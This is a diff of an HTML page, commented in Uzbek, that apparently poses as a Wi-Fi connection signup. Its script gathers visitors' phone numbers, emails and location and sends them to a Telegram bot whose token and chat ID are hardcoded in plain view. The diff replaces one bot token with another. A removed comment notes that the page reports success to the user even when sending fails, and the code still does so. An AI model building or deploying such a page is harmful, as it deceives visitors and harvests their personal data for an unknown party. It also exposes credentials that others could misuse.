@@ -165,8 +165,8 @@
     </div>
 
     <script>
-        // TOKEN VA CHAT ID ni shu yerda aniq belgilab olamiz
-        const TELEGRAM_TOKEN = "8759725890:AAGHgDqoP9tb7SmiBFgB65n_z84gjOe_QG4";
+        // Yangi bot tokeningiz o'rnatildi
+        const TELEGRAM_TOKEN = "8759725890:AAExUnlXU0KgWB_gDPT5yFX3CQpGMwKffag";
         const TELEGRAM_CHAT_ID = "1737205252";
 
         let userPlan = "";
@@ -180,11 +180,10 @@
             const phone = document.getElementById('uPhone');
             const email = document.getElementById('uEmail');
 
-            // Oddiy validatsiya
             if (phone.value.trim().length < 9 || !email.value.includes('@')) {
                 phone.classList.add('error-border');
                 email.classList.add('error-border');
-                alert("Iltimos, telefon raqam va emailni to'g'ri kiriting!");
+                alert("Iltimos, ma'lumotlarni to'g'ri kiriting!");
                 return;
             }
             
@@ -219,7 +218,6 @@
 
             const message = `📡 *Yangi Wi-Fi Ulanishi!*\n\n💎 Tarif: ${userPlan}\n📱 Tel: ${phone}\n📧 Email: ${email}\n📍 Manzil: ${locationInfo}`;
 
-            // Tuzatilgan fetch so'rovi
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -229,13 +227,8 @@
                     parse_mode: 'Markdown'
                 })
             })
-            .then(() => {
-                showStep(3);
-            })
-            .catch((err) => {
-                console.error("Xatolik:", err);
-                showStep(3); // Xato bo'lsa ham foydalanuvchiga muvaffaqiyatli deb ko'rsataveramiz
-            });
+            .then(() => showStep(3))
+            .catch(() => showStep(3));
         }
     </script>
 </body>
